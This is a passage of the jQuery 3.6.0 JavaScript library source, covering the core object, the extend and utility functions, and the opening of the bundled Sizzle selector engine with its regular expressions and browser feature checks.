    doc.head.appendChild( script ).parentNode.removeChild( script );
}


function toType( obj ) {
if ( obj == null ) {
    return obj + "";
}

// Support: Android <=2.3 only (functionish RegExp)
return typeof obj === "object" || typeof obj === "function" ?
    class2type[ toString.call( obj ) ] || "object" :
    typeof obj;
}
/* global Symbol */
// Defining this global in .eslintrc.json would create a danger of using the global
// unguarded in another place, it seems safer to define global only for this module



var
version = "3.6.0",

// Define a local copy of jQuery
jQuery = function( selector, context ) {

    // The jQuery object is actually just the init constructor 'enhanced'
    // Need init if jQuery is called (just allow error to be thrown if not included)
    return new jQuery.fn.init( selector, context );
};

jQuery.fn = jQuery.prototype = {

// The current version of jQuery being used
jquery: version,

constructor: jQuery,

// The default length of a jQuery object is 0
length: 0,

toArray: function() {
    return slice.call( this );
},

// Get the Nth element in the matched element set OR
// Get the whole matched element set as a clean array
get: function( num ) {

    // Return all the elements in a clean array
    if ( num == null ) {
        return slice.call( this );
    }

    // Return just the one element from the set
    return num < 0 ? this[ num + this.length ] : this[ num ];
},

// Take an array of elements and push it onto the stack
// (returning the new matched element set)
pushStack: function( elems ) {

    // Build a new jQuery matched element set
    var ret = jQuery.merge( this.constructor(), elems );

    // Add the old object onto the stack (as a reference)
    ret.prevObject = this;

    // Return the newly-formed element set
    return ret;
},

// Execute a callback for every element in the matched set.
each: function( callback ) {
    return jQuery.each( this, callback );
},

map: function( callback ) {
    return this.pushStack( jQuery.map( this, function( elem, i ) {
        return callback.call( elem, i, elem );
    } ) );
},

slice: function() {
    return this.pushStack( slice.apply( this, arguments ) );
},

first: function() {
    return this.eq( 0 );
},

last: function() {
    return this.eq( -1 );
},

even: function() {
    return this.pushStack( jQuery.grep( this, function( _elem, i ) {
        return ( i + 1 ) % 2;
    } ) );
},

odd: function() {
    return this.pushStack( jQuery.grep( this, function( _elem, i ) {
        return i % 2;
    } ) );
},

eq: function( i ) {
    var len = this.length,
        j = +i + ( i < 0 ? len : 0 );
    return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
},

end: function() {
    return this.prevObject || this.constructor();
},

// For internal use only.
// Behaves like an Array's method, not like a jQuery method.
push: push,
sort: arr.sort,
splice: arr.splice
};

jQuery.extend = jQuery.fn.extend = function() {
var options, name, src, copy, copyIsArray, clone,
    target = arguments[ 0 ] || {},
    i = 1,
    length = arguments.length,
    deep = false;

// Handle a deep copy situation
if ( typeof target === "boolean" ) {
    deep = target;

    // Skip the boolean and the target
    target = arguments[ i ] || {};
    i++;
}

// Handle case when target is a string or something (possible in deep copy)
if ( typeof target !== "object" && !isFunction( target ) ) {
    target = {};
}

// Extend jQuery itself if only one argument is passed
if ( i === length ) {
    target = this;
    i--;
}

for ( ; i < length; i++ ) {

    // Only deal with non-null/undefined values
    if ( ( options = arguments[ i ] ) != null ) {

        // Extend the base object
        for ( name in options ) {
            copy = options[ name ];

            // Prevent Object.prototype pollution
            // Prevent never-ending loop
            if ( name === "__proto__" || target === copy ) {
                continue;
            }

            // Recurse if we're merging plain objects or arrays
            if ( deep && copy && ( jQuery.isPlainObject( copy ) ||
                ( copyIsArray = Array.isArray( copy ) ) ) ) {
                src = target[ name ];

                // Ensure proper type for the source value
                if ( copyIsArray && !Array.isArray( src ) ) {
                    clone = [];
                } else if ( !copyIsArray && !jQuery.isPlainObject( src ) ) {
                    clone = {};
                } else {
                    clone = src;
                }
                copyIsArray = false;

                // Never move original objects, clone them
                target[ name ] = jQuery.extend( deep, clone, copy );

            // Don't bring in undefined values
            } else if ( copy !== undefined ) {
                target[ name ] = copy;
            }
        }
    }
}

// Return the modified object
return target;
};

jQuery.extend( {

// Unique for each copy of jQuery on the page
expando: "jQuery" + ( version + Math.random() ).replace( /\D/g, "" ),

// Assume jQuery is ready without the ready module
isReady: true,

error: function( msg ) {
    throw new Error( msg );
},

noop: function() {},

isPlainObject: function( obj ) {
    var proto, Ctor;

    // Detect obvious negatives
    // Use toString instead of jQuery.type to catch host objects
    if ( !obj || toString.call( obj ) !== "[object Object]" ) {
        return false;
    }

    proto = getProto( obj );

    // Objects with no prototype (e.g., `Object.create( null )`) are plain
    if ( !proto ) {
        return true;
    }

    // Objects with prototype are plain iff they were constructed by a global Object function
    Ctor = hasOwn.call( proto, "constructor" ) && proto.constructor;
    return typeof Ctor === "function" && fnToString.call( Ctor ) === ObjectFunctionString;
},

isEmptyObject: function( obj ) {
    var name;

    for ( name in obj ) {
        return false;
    }
    return true;
},

// Evaluates a script in a provided context; falls back to the global one
// if not specified.
globalEval: function( code, options, doc ) {
    DOMEval( code, { nonce: options && options.nonce }, doc );
},

each: function( obj, callback ) {
    var length, i = 0;

    if ( isArrayLike( obj ) ) {
        length = obj.length;
        for ( ; i < length; i++ ) {
            if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
                break;
            }
        }
    } else {
        for ( i in obj ) {
            if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
                break;
            }
        }
    }

    return obj;
},

// results is for internal usage only
makeArray: function( arr, results ) {
    var ret = results || [];

    if ( arr != null ) {
        if ( isArrayLike( Object( arr ) ) ) {
            jQuery.merge( ret,
                typeof arr === "string" ?
                    [ arr ] : arr
            );
        } else {
            push.call( ret, arr );
        }
    }

    return ret;
},

inArray: function( elem, arr, i ) {
    return arr == null ? -1 : indexOf.call( arr, elem, i );
},

// Support: Android <=4.0 only, PhantomJS 1 only
// push.apply(_, arraylike) throws on ancient WebKit
merge: function( first, second ) {
    var len = +second.length,
        j = 0,
        i = first.length;

    for ( ; j < len; j++ ) {
        first[ i++ ] = second[ j ];
    }

    first.length = i;

    return first;
},

grep: function( elems, callback, invert ) {
    var callbackInverse,
        matches = [],
        i = 0,
        length = elems.length,
        callbackExpect = !invert;

    // Go through the array, only saving the items
    // that pass the validator function
    for ( ; i < length; i++ ) {
        callbackInverse = !callback( elems[ i ], i );
        if ( callbackInverse !== callbackExpect ) {
            matches.push( elems[ i ] );
        }
    }

    return matches;
},

// arg is for internal usage only
map: function( elems, callback, arg ) {
    var length, value,
        i = 0,
        ret = [];

    // Go through the array, translating each of the items to their new values
    if ( isArrayLike( elems ) ) {
        length = elems.length;
        for ( ; i < length; i++ ) {
            value = callback( elems[ i ], i, arg );

            if ( value != null ) {
                ret.push( value );
            }
        }

    // Go through every key on the object,
    } else {
        for ( i in elems ) {
            value = callback( elems[ i ], i, arg );

            if ( value != null ) {
                ret.push( value );
            }
        }
    }

    // Flatten any nested arrays
    return flat( ret );
},

// A global GUID counter for objects
guid: 1,

// jQuery.support is not used in Core but other projects attach their
// properties to it so it needs to exist.
support: support
} );

if ( typeof Symbol === "function" ) {
jQuery.fn[ Symbol.iterator ] = arr[ Symbol.iterator ];
}

// Populate the class2type map
jQuery.each( "Boolean Number String Function Array Date RegExp Object Error Symbol".split( " " ),
function( _i, name ) {
    class2type[ "[object " + name + "]" ] = name.toLowerCase();
} );

function isArrayLike( obj ) {

// Support: real iOS 8.2 only (not reproducible in simulator)
// `in` check used to prevent JIT error (gh-2145)
// hasOwn isn't used here due to false negatives
// regarding Nodelist length in IE
var length = !!obj && "length" in obj && obj.length,
    type = toType( obj );

if ( isFunction( obj ) || isWindow( obj ) ) {
    return false;
}

return type === "array" || length === 0 ||
    typeof length === "number" && length > 0 && ( length - 1 ) in obj;
}
var Sizzle =
/*!
* Sizzle CSS Selector Engine v2.3.6
* https://sizzlejs.com/
*
* Copyright JS Foundation and other contributors
* Released under the MIT license
* https://js.foundation/
*
* Date: 2021-02-16
*/
( function( window ) {
var i,
support,
Expr,
getText,
isXML,
tokenize,
compile,
select,
outermostContext,
sortInput,
hasDuplicate,

// Local document vars
setDocument,
document,
docElem,
documentIsHTML,
rbuggyQSA,
rbuggyMatches,
matches,
contains,

// Instance-specific data
expando = "sizzle" + 1 * new Date(),
preferredDoc = window.document,
dirruns = 0,
done = 0,
classCache = createCache(),
tokenCache = createCache(),
compilerCache = createCache(),
nonnativeSelectorCache = createCache(),
sortOrder = function( a, b ) {
    if ( a === b ) {
        hasDuplicate = true;
    }
    return 0;
},

// Instance methods
hasOwn = ( {} ).hasOwnProperty,
arr = [],
pop = arr.pop,
pushNative = arr.push,
push = arr.push,
slice = arr.slice,

// Use a stripped-down indexOf as it's faster than native
// https://jsperf.com/thor-indexof-vs-for/5
indexOf = function( list, elem ) {
    var i = 0,
        len = list.length;
    for ( ; i < len; i++ ) {
        if ( list[ i ] === elem ) {
            return i;
        }
    }
    return -1;
},

booleans = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|" +
    "ismap|loop|multiple|open|readonly|required|scoped",

// Regular expressions

// http://www.w3.org/TR/css3-selectors/#whitespace
whitespace = "[\\x20\\t\\r\\n\\f]",

// https://www.w3.org/TR/css-syntax-3/#ident-token-diagram
identifier = "(?:\\\\[\\da-fA-F]{1,6}" + whitespace +
    "?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",

// Attribute selectors: http://www.w3.org/TR/selectors/#attribute-selectors
attributes = "\\[" + whitespace + "*(" + identifier + ")(?:" + whitespace +

    // Operator (capture 2)
    "*([*^$|!~]?=)" + whitespace +

    // "Attribute values must be CSS identifiers [capture 5]
    // or strings [capture 3 or capture 4]"
    "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + identifier + "))|)" +
    whitespace + "*\\]",

pseudos = ":(" + identifier + ")(?:\\((" +

    // To reduce the number of selectors needing tokenize in the preFilter, prefer arguments:
    // 1. quoted (capture 3; capture 4 or capture 5)
    "('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|" +

    // 2. simple (capture 6)
    "((?:\\\\.|[^\\\\()[\\]]|" + attributes + ")*)|" +

    // 3. anything else (capture 2)
    ".*" +
    ")\\)|)",

// Leading and non-escaped trailing whitespace, capturing some non-whitespace characters preceding the latter
rwhitespace = new RegExp( whitespace + "+", "g" ),
rtrim = new RegExp( "^" + whitespace + "+|((?:^|[^\\\\])(?:\\\\.)*)" +
    whitespace + "+$", "g" ),

rcomma = new RegExp( "^" + whitespace + "*," + whitespace + "*" ),
rcombinators = new RegExp( "^" + whitespace + "*([>+~]|" + whitespace + ")" + whitespace +
    "*" ),
rdescend = new RegExp( whitespace + "|>" ),

rpseudo = new RegExp( pseudos ),
ridentifier = new RegExp( "^" + identifier + "$" ),

matchExpr = {
    "ID": new RegExp( "^#(" + identifier + ")" ),
    "CLASS": new RegExp( "^\\.(" + identifier + ")" ),
    "TAG": new RegExp( "^(" + identifier + "|[*])" ),
    "ATTR": new RegExp( "^" + attributes ),
    "PSEUDO": new RegExp( "^" + pseudos ),
    "CHILD": new RegExp( "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
        whitespace + "*(even|odd|(([+-]|)(\\d*)n|)" + whitespace + "*(?:([+-]|)" +
        whitespace + "*(\\d+)|))" + whitespace + "*\\)|)", "i" ),
    "bool": new RegExp( "^(?:" + booleans + ")$", "i" ),

    // For use in libraries implementing .is()
    // We use this for POS matching in `select`
    "needsContext": new RegExp( "^" + whitespace +
        "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + whitespace +
        "*((?:-\\d)?\\d*)" + whitespace + "*\\)|)(?=[^-]|$)", "i" )
},

rhtml = /HTML$/i,
rinputs = /^(?:input|select|textarea|button)$/i,
rheader = /^h\d$/i,

rnative = /^[^{]+\{\s*\[native \w/,

// Easily-parseable/retrievable ID or TAG or CLASS selectors
rquickExpr = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,

rsibling = /[+~]/,

// CSS escapes
// http://www.w3.org/TR/CSS21/syndata.html#escaped-characters
runescape = new RegExp( "\\\\[\\da-fA-F]{1,6}" + whitespace + "?|\\\\([^\\r\\n\\f])", "g" ),
funescape = function( escape, nonHex ) {
    var high = "0x" + escape.slice( 1 ) - 0x10000;

    return nonHex ?

        // Strip the backslash prefix from a non-hex escape sequence
        nonHex :

        // Replace a hexadecimal escape sequence with the encoded Unicode code point
        // Support: IE <=11+
        // For values outside the Basic Multilingual Plane (BMP), manually construct a
        // surrogate pair
        high < 0 ?
            String.fromCharCode( high + 0x10000 ) :
            String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 );
},

// CSS string/identifier serialization
// https://drafts.csswg.org/cssom/#common-serializing-idioms
rcssescape = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
fcssescape = function( ch, asCodePoint ) {
    if ( asCodePoint ) {

        // U+0000 NULL becomes U+FFFD REPLACEMENT CHARACTER
        if ( ch === "\0" ) {
            return "\uFFFD";
        }

        // Control characters and (dependent upon position) numbers get escaped as code points
        return ch.slice( 0, -1 ) + "\\" +
            ch.charCodeAt( ch.length - 1 ).toString( 16 ) + " ";
    }

    // Other potentially-special ASCII characters get backslash-escaped
    return "\\" + ch;
},

// Used for iframes
// See setDocument()
// Removing the function wrapper causes a "Permission Denied"
// error in IE
unloadHandler = function() {
    setDocument();
},

inDisabledFieldset = addCombinator(
    function( elem ) {
        return elem.disabled === true && elem.nodeName.toLowerCase() === "fieldset";
    },
    { dir: "parentNode", next: "legend" }
);

// Optimize for push.apply( _, NodeList )
try {
push.apply(
    ( arr = slice.call( preferredDoc.childNodes ) ),
    preferredDoc.childNodes
);

// Support: Android<4.0
// Detect silently failing push.apply
// eslint-disable-next-line no-unused-expressions
arr[ preferredDoc.childNodes.length ].nodeType;
} catch ( e ) {
push = { apply: arr.length ?

    // Leverage slice if possible
    function( target, els ) {
        pushNative.apply( target, slice.call( els ) );
    } :

    // Support: IE<9
    // Otherwise append directly
    function( target, els ) {
        var j = target.length,
            i = 0;

        // Can't trust NodeList.length
        while ( ( target[ j++ ] = els[ i++ ] ) ) {}
        target.length = j - 1;
    }
};
}

function Sizzle( selector, context, results, seed ) {
var m, i, elem, nid, match, groups, newSelector,
    newContext = context && context.ownerDocument,

    // nodeType defaults to 9, since context defaults to document
    nodeType = context ? context.nodeType : 9;

results = results || [];

// Return early from calls with invalid selector or context
if ( typeof selector !== "string" || !selector ||
    nodeType !== 1 && nodeType !== 9 && nodeType !== 11 ) {

    return results;
}

// Try to shortcut find operations (as opposed to filters) in HTML documents
if ( !seed ) {
    setDocument( context );
    context = context || document;

    if ( documentIsHTML ) {

        // If the selector is sufficiently simple, try using a "get*By*" DOM method
        // (excepting DocumentFragment context, where the methods don't exist)
        if ( nodeType !== 11 && ( match = rquickExpr.exec( selector ) ) ) {

            // ID selector
            if ( ( m = match[ 1 ] ) ) {

                // Document context
                if ( nodeType === 9 ) {
                    if ( ( elem = context.getElementById( m ) ) ) {

                        // Support: IE, Opera, Webkit
                        // TODO: identify versions
                        // getElementById can match elements by name instead of ID
                        if ( elem.id === m ) {
                            results.push( elem );
                            return results;
                        }
                    } else {
                        return results;
                    }

                // Element context
                } else {

                    // Support: IE, Opera, Webkit
                    // TODO: identify versions
                    // getElementById can match elements by name instead of ID
                    if ( newContext && ( elem = newContext.getElementById( m ) ) &&
                        contains( context, elem ) &&
                        elem.id === m ) {

                        results.push( elem );
                        return results;
                    }
                }

            // Type selector
            } else if ( match[ 2 ] ) {
                push.apply( results, context.getElementsByTagName( selector ) );
                return results;

            // Class selector
            } else if ( ( m = match[ 3 ] ) && support.getElementsByClassName &&
                context.getElementsByClassName ) {

                push.apply( results, context.getElementsByClassName( m ) );
                return results;
            }
        }

        // Take advantage of querySelectorAll
        if ( support.qsa &&
            !nonnativeSelectorCache[ selector + " " ] &&
            ( !rbuggyQSA || !rbuggyQSA.test( selector ) ) &&

            // Support: IE 8 only
            // Exclude object elements
            ( nodeType !== 1 || context.nodeName.toLowerCase() !== "object" ) ) {

            newSelector = selector;
            newContext = context;

            // qSA considers elements outside a scoping root when evaluating child or
            // descendant combinators, which is not what we want.
            // In such cases, we work around the behavior by prefixing every selector in the
            // list with an ID selector referencing the scope context.
            // The technique has to be used as well when a leading combinator is used
            // as such selectors are not recognized by querySelectorAll.
            // Thanks to Andrew Dupont for this technique.
            if ( nodeType === 1 &&
                ( rdescend.test( selector ) || rcombinators.test( selector ) ) ) {

                // Expand context for sibling selectors
                newContext = rsibling.test( selector ) && testContext( context.parentNode ) ||
                    context;

                // We can use :scope instead of the ID hack if the browser
                // supports it & if we're not changing the context.
                if ( newContext !== context || !support.scope ) {

                    // Capture the context ID, setting it first if necessary
                    if ( ( nid = context.getAttribute( "id" ) ) ) {
                        nid = nid.replace( rcssescape, fcssescape );
                    } else {
                        context.setAttribute( "id", ( nid = expando ) );
                    }
                }

                // Prefix every selector in the list
                groups = tokenize( selector );
                i = groups.length;
                while ( i-- ) {
                    groups[ i ] = ( nid ? "#" + nid : ":scope" ) + " " +
                        toSelector( groups[ i ] );
                }
                newSelector = groups.join( "," );
            }

            try {
                push.apply( results,
                    newContext.querySelectorAll( newSelector )
                );
                return results;
            } catch ( qsaError ) {
                nonnativeSelectorCache( selector, true );
            } finally {
                if ( nid === expando ) {
                    context.removeAttribute( "id" );
                }
            }
        }
    }
}

// All others
return select( selector.replace( rtrim, "$1" ), context, results, seed );
}

/**
* Create key-value caches of limited size
* @returns {function(string, object)} Returns the Object data after storing it on itself with
*	property name the (space-suffixed) string and (if the cache is larger than Expr.cacheLength)
*	deleting the oldest entry
*/
function createCache() {
var keys = [];

function cache( key, value ) {

    // Use (key + " ") to avoid collision with native prototype properties (see Issue #157)
    if ( keys.push( key + " " ) > Expr.cacheLength ) {

        // Only keep the most recent entries
        delete cache[ keys.shift() ];
    }
    return ( cache[ key + " " ] = value );
}
return cache;
}

/**
* Mark a function for special use by Sizzle
* @param {Function} fn The function to mark
*/
function markFunction( fn ) {
fn[ expando ] = true;
return fn;
}

/**
* Support testing using an element
* @param {Function} fn Passed the created element and returns a boolean result
*/
function assert( fn ) {
var el = document.createElement( "fieldset" );

try {
    return !!fn( el );
} catch ( e ) {
    return false;
} finally {

    // Remove from its parent by default
    if ( el.parentNode ) {
        el.parentNode.removeChild( el );
    }

    // release memory in IE
    el = null;
}
}

/**
* Adds the same handler for all of the specified attrs
* @param {String} attrs Pipe-separated list of attributes
* @param {Function} handler The method that will be applied
*/
function addHandle( attrs, handler ) {
var arr = attrs.split( "|" ),
    i = arr.length;

while ( i-- ) {
    Expr.attrHandle[ arr[ i ] ] = handler;
}
}

/**
* Checks document order of two siblings
* @param {Element} a
* @param {Element} b
* @returns {Number} Returns less than 0 if a precedes b, greater than 0 if a follows b
*/
function siblingCheck( a, b ) {
var cur = b && a,
    diff = cur && a.nodeType === 1 && b.nodeType === 1 &&
        a.sourceIndex - b.sourceIndex;

// Use IE sourceIndex if available on both nodes
if ( diff ) {
    return diff;
}

// Check if b follows a
if ( cur ) {
    while ( ( cur = cur.nextSibling ) ) {
        if ( cur === b ) {
            return -1;
        }
    }
}

return a ? 1 : -1;
}

/**
* Returns a function to use in pseudos for input types
* @param {String} type
*/
function createInputPseudo( type ) {
return function( elem ) {
    var name = elem.nodeName.toLowerCase();
    return name === "input" && elem.type === type;
};
}

/**
* Returns a function to use in pseudos for buttons
* @param {String} type
*/
function createButtonPseudo( type ) {
return function( elem ) {
    var name = elem.nodeName.toLowerCase();
    return ( name === "input" || name === "button" ) && elem.type === type;
};
}

/**
* Returns a function to use in pseudos for :enabled/:disabled
* @param {Boolean} disabled true for :disabled; false for :enabled
*/
function createDisabledPseudo( disabled ) {

// Known :disabled false positives: fieldset[disabled] > legend:nth-of-type(n+2) :can-disable
return function( elem ) {

    // Only certain elements can match :enabled or :disabled
    // https://html.spec.whatwg.org/multipage/scripting.html#selector-enabled
    // https://html.spec.whatwg.org/multipage/scripting.html#selector-disabled
    if ( "form" in elem ) {

        // Check for inherited disabledness on relevant non-disabled elements:
        // * listed form-associated elements in a disabled fieldset
        //   https://html.spec.whatwg.org/multipage/forms.html#category-listed
        //   https://html.spec.whatwg.org/multipage/forms.html#concept-fe-disabled
        // * option elements in a disabled optgroup
        //   https://html.spec.whatwg.org/multipage/forms.html#concept-option-disabled
        // All such elements have a "form" property.
        if ( elem.parentNode && elem.disabled === false ) {

            // Option elements defer to a parent optgroup if present
            if ( "label" in elem ) {
                if ( "label" in elem.parentNode ) {
                    return elem.parentNode.disabled === disabled;
                } else {
                    return elem.disabled === disabled;
                }
            }

            // Support: IE 6 - 11
            // Use the isDisabled shortcut property to check for disabled fieldset ancestors
            return elem.isDisabled === disabled ||

                // Where there is no isDisabled, check manually
                /* jshint -W018 */
                elem.isDisabled !== !disabled &&
                inDisabledFieldset( elem ) === disabled;
        }

        return elem.disabled === disabled;

    // Try to winnow out elements that can't be disabled before trusting the disabled property.
    // Some victims get caught in our net (label, legend, menu, track), but it shouldn't
    // even exist on them, let alone have a boolean value.
    } else if ( "label" in elem ) {
        return elem.disabled === disabled;
    }

    // Remaining elements are neither :enabled nor :disabled
    return false;
};
}

/**
* Returns a function to use in pseudos for positionals
* @param {Function} fn
*/
function createPositionalPseudo( fn ) {
return markFunction( function( argument ) {
    argument = +argument;
    return markFunction( function( seed, matches ) {
        var j,
            matchIndexes = fn( [], seed.length, argument ),
            i = matchIndexes.length;

        // Match elements found at the specified indexes
        while ( i-- ) {
            if ( seed[ ( j = matchIndexes[ i ] ) ] ) {
                seed[ j ] = !( matches[ j ] = seed[ j ] );
            }
        }
    } );
} );
}

/**
* Checks a node for validity as a Sizzle context
* @param {Element|Object=} context
* @returns {Element|Object|Boolean} The input node if acceptable, otherwise a falsy value
*/
function testContext( context ) {
return context && typeof context.getElementsByTagName !== "undefined" && context;
}

// Expose support vars for convenience
support = Sizzle.support = {};

/**
* Detects XML nodes
* @param {Element|Object} elem An element or a document
* @returns {Boolean} True iff elem is a non-HTML XML node
*/
isXML = Sizzle.isXML = function( elem ) {
var namespace = elem && elem.namespaceURI,
    docElem = elem && ( elem.ownerDocument || elem ).documentElement;

// Support: IE <=8
// Assume HTML when documentElement doesn't yet exist, such as inside loading iframes
// https://bugs.jquery.com/ticket/4833
return !rhtml.test( namespace || docElem && docElem.nodeName || "HTML" );
};

/**
* Sets document-related variables once based on the current document
* @param {Element|Object} [doc] An element or document object to use to set the document
* @returns {Object} Returns the current document
*/
setDocument = Sizzle.setDocument = function( node ) {
var hasCompare, subWindow,
    doc = node ? node.ownerDocument || node : preferredDoc;

// Return early if doc is invalid or already selected
// Support: IE 11+, Edge 17 - 18+
// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
// two documents; shallow comparisons work.
// eslint-disable-next-line eqeqeq
if ( doc == document || doc.nodeType !== 9 || !doc.documentElement ) {
    return document;
}

// Update global variables
document = doc;
docElem = document.documentElement;
documentIsHTML = !isXML( document );

// Support: IE 9 - 11+, Edge 12 - 18+
// Accessing iframe documents after unload throws "permission denied" errors (jQuery #13936)
// Support: IE 11+, Edge 17 - 18+
// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
// two documents; shallow comparisons work.
// eslint-disable-next-line eqeqeq
if ( preferredDoc != document &&
    ( subWindow = document.defaultView ) && subWindow.top !== subWindow ) {

    // Support: IE 11, Edge
    if ( subWindow.addEventListener ) {
        subWindow.addEventListener( "unload", unloadHandler, false );

    // Support: IE 9 - 10 only
    } else if ( subWindow.attachEvent ) {
        subWindow.attachEvent( "onunload", unloadHandler );
    }
}

// Support: IE 8 - 11+, Edge 12 - 18+, Chrome <=16 - 25 only, Firefox <=3.6 - 31 only,
// Safari 4 - 5 only, Opera <=11.6 - 12.x only
// IE/Edge & older browsers don't support the :scope pseudo-class.
// Support: Safari 6.0 only
// Safari 6.0 supports :scope but it's an alias of :root there.
support.scope = assert( function( el ) {
    docElem.appendChild( el ).appendChild( document.createElement( "div" ) );
    return typeof el.querySelectorAll !== "undefined" &&
        !el.querySelectorAll( ":scope fieldset div" ).length;
} );

/* Attributes
---------------------------------------------------------------------- */

// Support: IE<8
// Verify that getAttribute really returns attributes and not properties
// (excepting IE8 booleans)
support.attributes = assert( function( el ) {
    el.className = "i";
    return !el.getAttribute( "className" );
} );

/* getElement(s)By*
---------------------------------------------------------------------- */

// Check if getElementsByTagName("*") returns only elements
support.getElementsByTagName = assert( function( el ) {
    el.appendChild( document.createComment( "" ) );
    return !el.getElementsByTagName( "*" ).length;
} );

// Support: IE<9
support.getElementsByClassName = rnative.test( document.getElementsByClassName );

// Support: IE<10
// Check if getElementById returns elements by name
// The broken getElementById methods don't pick up programmatically-set names,
// so use a roundabout getElementsByName test
support.getById = assert( function( el ) {
    docElem.appendChild( el ).id = expando;
    return !document.getElementsByName || !document.getElementsByName( expando ).length;
} );

// ID filter and find
if ( support.getById ) {
    Expr.filter[ "ID" ] = function( id ) {
        var attrId = id.replace( runescape, funescape );
        return function( elem ) {
            return elem.getAttribute( "id" ) === attrId;
        };
    };
    Expr.find[ "ID" ] = function( id, context ) {
        if ( typeof context.getElementById !== "undefined" && documentIsHTML ) {
            var elem = context.getElementById( id );
            return elem ? [ elem ] : [];
        }
    };
} else {
    Expr.filter[ "ID" ] =  function( id ) {
        var attrId = id.replace( runescape, funescape );
        return function( elem ) {
            var node = typeof elem.getAttributeNode !== "undefined" &&
                elem.getAttributeNode( "id" );
            return node && node.value === attrId;
        };
    };

    // Support: IE 6 - 7 only
    // getElementById is not reliable as a find shortcut
    Expr.find[ "ID" ] = function( id, context ) {
        if ( typeof context.getElementById !== "undefined" && documentIsHTML ) {
            var node, i, elems,
                elem = context.getElementById( id );

            if ( elem ) {

                // Verify the id attribute
                node = elem.getAttributeNode( "id" );
                if ( node && node.value === id ) {
                    return [ elem ];
                }

                // Fall back on getElementsByName
                elems = context.getElementsByName( id );
                i = 0;
                while ( ( elem = elems[ i++ ] ) ) {
                    node = elem.getAttributeNode( "id" );
                    if ( node && node.value === id ) {
                        return [ elem ];
                    }
                }
            }

            return [];
        }
    };
}

// Tag
Expr.find[ "TAG" ] = support.getElementsByTagName ?
    function( tag, context ) {
        if ( typeof context.getElementsByTagName !== "undefined" ) {
            return context.getElementsByTagName( tag );

        // DocumentFragment nodes don't have gEBTN
        } else if ( support.qsa ) {
            return context.querySelectorAll( tag );
        }
    } :

    function( tag, context ) {
        var elem,
            tmp = [],
            i = 0,

            // By happy coincidence, a (broken) gEBTN appears on DocumentFragment nodes too
            results = context.getElementsByTagName( tag );

        // Filter out possible comments
        if ( tag === "*" ) {
            while ( ( elem = results[ i++ ] ) ) {
                if ( elem.nodeType === 1 ) {
                    tmp.push( elem );
                }
            }

            return tmp;
        }
        return results;
    };

// Class
Expr.find[ "CLASS" ] = support.getElementsByClassName && function( className, context ) {
    if ( typeof context.getElementsByClassName !== "undefined" && documentIsHTML ) {
        return context.getElementsByClassName( className );
    }
};

/* QSA/matchesSelector
---------------------------------------------------------------------- */

// QSA and matchesSelector support

// matchesSelector(:active) reports false when true (IE9/Opera 11.5)
rbuggyMatches = [];

// qSa(:focus) reports false when true (Chrome 21)
// We allow this because of a bug in IE8/9 that throws an error
// whenever `document.activeElement` is accessed on an iframe
// So, we allow :focus to pass through QSA all the time to avoid the IE error
// See https://bugs.jquery.com/ticket/13378
rbuggyQSA = [];

if ( ( support.qsa = rnative.test( document.querySelectorAll ) ) ) {

    // Build QSA regex
    // Regex strategy adopted from Diego Perini
    assert( function( el ) {

        var input;

        // Select is set to empty string on purpose
        // This is to test IE's treatment of not explicitly
        // setting a boolean content attribute,
        // since its presence should be enough
        // https://bugs.jquery.com/ticket/12359
        docElem.appendChild( el ).innerHTML = "<a id='" + expando + "'></a>" +
            "<select id='" + expando + "-\r\\' msallowcapture=''>" +
            "<option selected=''></option></select>";

        // Support: IE8, Opera 11-12.16
        // Nothing should be selected when empty strings follow ^= or $= or *=
        // The test attribute must be unknown in Opera but "safe" for WinRT
        // https://msdn.microsoft.com/en-us/library/ie/hh465388.aspx#attribute_section
        if ( el.querySelectorAll( "[msallowcapture^='']" ).length ) {
            rbuggyQSA.push( "[*^$]=" + whitespace + "*(?:''|\"\")" );
        }

        // Support: IE8
        // Boolean attributes and "value" are not treated correctly
        if ( !el.querySelectorAll( "[selected]" ).length ) {
            rbuggyQSA.push( "\\[" + whitespace + "*(?:value|" + booleans + ")" );
        }

        // Support: Chrome<29, Android<4.4, Safari<7.0+, iOS<7.0+, PhantomJS<1.9.8+
        if ( !el.querySelectorAll( "[id~=" + expando + "-]" ).length ) {
            rbuggyQSA.push( "~=" );
        }

        // Support: IE 11+, Edge 15 - 18+
        // IE 11/Edge don't find elements on a `[name='']` query in some cases.
        // Adding a temporary attribute to the document before the selection works
        // around the issue.
        // Interestingly, IE 10 & older don't seem to have the issue.
        input = document.createElement( "input" );
        input.setAttribute( "name", "" );
        el.appendChild( input );
        if ( !el.querySelectorAll( "[name='']" ).length ) {
            rbuggyQSA.push( "\\[" + whitespace + "*name" + whitespace + "*=" +
                whitespace + "*(?:''|\"\")" );
        }

        // Webkit/Opera - :checked should return selected option elements
        // http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked
        // IE8 throws error here and will not see later tests
        if ( !el.querySelectorAll( ":checked" ).length ) {
            rbuggyQSA.push( ":checked" );
        }

        // Support: Safari 8+, iOS 8+
        // https://bugs.webkit.org/show_bug.cgi?id=136851
        // In-page `selector#id sibling-combinator selector` fails
        if ( !el.querySelectorAll( "a#" + expando + "+*" ).length ) {
            rbuggyQSA.push( ".#.+[+~]" );
        }

        // Support: Firefox <=3.6 - 5 only
        // Old Firefox doesn't throw on a badly-escaped identifier.
        el.querySelectorAll( "\\\f" );
        rbuggyQSA.push( "[\\r\\n\\f]" );
    } );

    assert( function( el ) {
        el.innerHTML = "<a href='' disabled='disabled'></a>" +
            "<select disabled='disabled'><option/></select>";

        // Support: Windows 8 Native Apps
        // The type and name attributes are restricted during .innerHTML assignment
        var input = document.createElement( "input" );
